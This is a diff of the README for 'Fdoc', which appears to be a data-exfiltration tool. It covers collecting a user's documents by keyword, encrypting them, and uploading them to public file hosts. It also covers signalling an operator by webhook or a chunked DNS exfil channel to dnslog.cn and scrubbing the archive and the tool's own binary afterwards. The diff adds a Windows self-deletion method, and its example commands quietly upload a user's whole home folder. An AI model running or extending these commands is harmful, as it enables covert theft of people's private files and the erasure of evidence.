@@ -34,7 +34,7 @@ Static binaries for Linux, Windows, and macOS.
                   presets: documents, all (common docs+archives+txt; NOT every file),
                            archives|packages, images, videos, any (no ext filter)
   -f string       fuzzy filename match, comma-separated (OR); AND with other filters
-  -k string       content keywords, comma-separated (OR); AND with other filters
+  -k, -keyword    content keywords, comma-separated (OR); prefer -keyword (-k ≠ -key)
                   (skips binary; scans up to 8MB per file)
   -max string     max total LOGICAL size of matched files (default 1GB);
                   packing stops at the limit and KEEPS the partial archive (exit 2)
@@ -45,11 +45,13 @@ Static binaries for Linux, Windows, and macOS.
   -t string       only files modified on/after this local date, e.g. 2023-10-01
   -x string       comma-separated directories to skip (replaces defaults if set)
   -q              quiet mode
-  -v              verbose (matched paths + upload probe/retry details)
+  -v              verbose (matched paths + per-backend probe OK/FAIL)
 
   -upload         after packing, upload archive (auto backend); local link echo unless -webhook/-dns
-  -b string       pin upload backend (default: auto probe+failover by archive size)
-  -force          allow flaky/down upload backends
+  -b string       pin upload backend (default: auto; list with: Fdoc backends)
+  -force          overwrite existing -o; also allow flaky/down upload backends
+  -progress-interval float
+                  minutes between upload/encrypt progress lines when no bar (default 0.5=30s; 0=off)
   -webhook string optional HTTPS callback URL (POST JSON)
   -dns string     optional DNSLog base (failover if webhook fails/unset)
   -task-id string task id in callback (auto-generated if empty; with -webhook/-dns)
@@ -57,15 +59,18 @@ Static binaries for Linux, Windows, and macOS.
                   webhook timeout / DNS budget seconds (default 15)
   -scrub          after successful upload (+ callback if any), delete archive and self
   -encrypt        encrypt stream before upload (requires -upload and -key)
-  -key string     encryption key for -encrypt (not the same as -k keyword)
+  -key string     encryption key for -encrypt (not the same as -k/-keyword)
 ```
+
+Subcommands: `Fdoc backends`, `Fdoc decrypt …`.
 
 ### Upload + callback
 
 Flow: pack → auto upload by archive size → **local link echo** and/or **failover callback** → optional `-scrub`.
 
 - **No `-webhook` / `-dns`**: print `UPLOAD_OK ...` on stderr and the bare download URL on stdout (script-friendly).
-- **With `-webhook` / `-dns`**: failover callback (HTTPS webhook first; DNS only if webhook fails or is unset). Not dual-send.
+- **With `-webhook` / `-dns`**: failover callback (HTTPS webhook first; DNS only if webhook fails or is unset). Not dual-send. Bare URL is still echoed on **stderr** for local recovery.
+- Without `-q`, stderr also shows brief `auto: probing…` / `auto: using …` (use `-v` for per-backend OK/FAIL).
 
 `-webhook` example values:
 
@@ -128,7 +133,9 @@ Requires all chunks `0`..`total-1` for the same `task_id`. Missing a chunk exits
 
 Runtime DNS callback also requires **every** chunk query to leave the host (NXDOMAIN counts; per-chunk timeout does not). Partial DNS success is treated as callback failure. `-cb-timeout` is both the webhook timeout and the **total DNS exfil budget**.
 
-**Scrub trust model**: `-scrub` runs after a successful upload; if `-webhook`/`-dns` were set, also requires a successful callback (webhook 2xx **or** all DNS chunk queries sent). That does **not** verify your receiver stored the URL. Prefer webhook for C2-independent recovery; be cautious with DNS-only + `-scrub`. Windows self-delete may need admin (logs `SCRUB_PARTIAL` on failure).
+**Scrub trust model**: `-scrub` runs after a successful upload; if `-webhook`/`-dns` were set, also requires a successful callback (webhook 2xx **or** all DNS chunk queries sent). That does **not** verify your receiver stored the URL. Prefer webhook for C2-independent recovery; be cautious with DNS-only + `-scrub`.
+
+**Windows scrub**: archive delete is best-effort as usual. Self-delete tries (1) immediate remove, (2) rename + `MoveFileEx` reboot delete (often needs admin), then (3) a short delayed `cmd` delete under `%TEMP%` (no admin). If all fail, stderr shows `SCRUB_PARTIAL`. Non-admin runs usually still remove the archive; binary cleanup is best-effort.
 
 `-scrub` / `-encrypt` require `-upload`. `-webhook` must be `https://` (or `http://` to loopback for local tests). Omit `-scrub` to keep the archive and binary.
 
@@ -143,16 +150,17 @@ On Unix, `-upload` ignores `SIGHUP` so a dead parent session is less likely to k
 ```
 
 - Key: PKCS7-pad `SECRET` to **32 bytes** → AES-256 key (not PBKDF2)
-- Remote filename stays `*.tgz` (or `*.tar.gz` → `*.tgz`) for host friendliness, but the **bytes are ciphertext**, not a gzip archive
-- On success stderr shows `ENCRYPT_OK plain=… cipher=… decrypt_first=1 …` — **always run `Fdoc decrypt` before** `tar` / `gunzip`
+- Remote filename for encrypted uploads is `*.bin` (not a fake `*.tgz`) so hosts accept it and operators don't gunzip by mistake. Never uses `.encrypt` (tmpfiles rejects it)
+- On success stderr shows `ENCRYPT_OK plain=… cipher=… encrypted=1 decrypt_first=1 remote=….bin …` — **always run `Fdoc decrypt` before** `tar` / `gunzip`
+- `UPLOAD_OK` also includes `encrypted=1 decrypt_first=1` when `-encrypt` was used
 - Check with `xxd`: header should be `55 50 30 31` (`UP01`); `1f 8b` means plaintext gzip (not encrypted)
 - Downloaded size should match `ENCRYPT_OK cipher=`
-- **Disk**: `-encrypt` writes a temporary ciphertext beside the archive (same directory, not `/tmp`), so you need about **1× archive size** free on that volume for the duration of the upload. If that directory is not writable, it falls back to `TempDir` (may be tmpfs — watch RAM). `Fdoc decrypt` writes the full plaintext output (another ~1×) and streams decryption (no multi-GB RAM spike). `-q` only silences human logs; machine lines (`UPLOAD_OK` / `ENCRYPT_OK` / `DECRYPT_OK`) still print.
+- **Disk**: `-encrypt` writes a temporary ciphertext beside the archive (same directory, not `/tmp`), so you need about **1× archive size** free on that volume for the duration of the upload. If that directory is not writable, it falls back to `TempDir` (may be tmpfs — watch RAM). `Fdoc decrypt` writes the full plaintext output (another ~1×) and streams decryption (no multi-GB RAM spike). `-q` only silences human logs; machine lines (`UPLOAD_OK` / `ENCRYPT_OK` / `DECRYPT_OK` / `PACK_PROGRESS` / `UPLOAD_PROGRESS`) still print. Without `-q`, upload prints brief `auto: probing…` / `auto: using …` stage lines; `-v` adds per-backend probe OK/FAIL. Default `-progress-interval` is **0.5 minutes (30s)**.
 
 Decrypt with Fdoc (required before treating the download as an archive; no uploader binary needed):
 
 ```shell
-Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.tgz
+Fdoc decrypt -key 'SECRET' -o recovered.tgz downloaded.bin
 # default -o: name.tgz; if input is already *.tgz → name.dec.tgz (never overwrites input)
 # use -force to overwrite an existing output
 tar -tzf recovered.tgz
@@ -217,6 +225,13 @@ Fdoc -d /data -e documents -o /tmp/x.tgz -upload \
   -webhook https://webhook.site/<uuid> \
   -dns xxx.dnslog.cn \
   -task-id op42 -scrub -q
+
+# 7) Windows (cmd / PowerShell; prefer UTF-8 console for non-ASCII paths)
+# Default -d is %%USERPROFILE%%; default -x skips AppData caches under home.
+Fdoc.exe -d %USERPROFILE%\Documents -e documents -o %TEMP%\docs.tgz
+Fdoc.exe -d %USERPROFILE% -o %TEMP%\home.tgz -upload -q
+# Whole-drive scan: pass system dirs yourself, e.g.
+#   -x "C:\Windows,C:\Program Files,C:\Program Files (x86)"
 
 # Decrypt a downloaded ciphertext
 Fdoc decrypt -key 'secret' -o /tmp/recovered.tgz ~/Downloads/xxx.bin
